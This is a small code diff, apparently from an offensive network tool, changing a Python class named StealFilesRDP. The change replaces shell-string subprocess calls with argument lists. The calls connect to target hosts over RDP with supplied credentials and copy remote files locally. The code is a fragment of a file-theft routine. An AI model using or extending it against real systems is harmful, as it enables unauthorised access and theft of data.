@@ -42,8 +42,8 @@ class StealFilesRDP:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                 return None
-            command = f"xfreerdp /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            command = ['xfreerdp', f'/v:{ip}', f'/u:{username}', f'/p:{password}', f'/drive:shared,/mnt/shared']
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             if process.returncode == 0:
                 logger.info(f"Connected to {ip} via RDP with username {username}")
@@ -87,8 +87,8 @@ class StealFilesRDP:
                 return
             local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
             os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
-            command = f"cp {remote_file} {local_file_path}"
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            command = ['cp', remote_file, local_file_path]
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             if process.returncode == 0:
                 logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
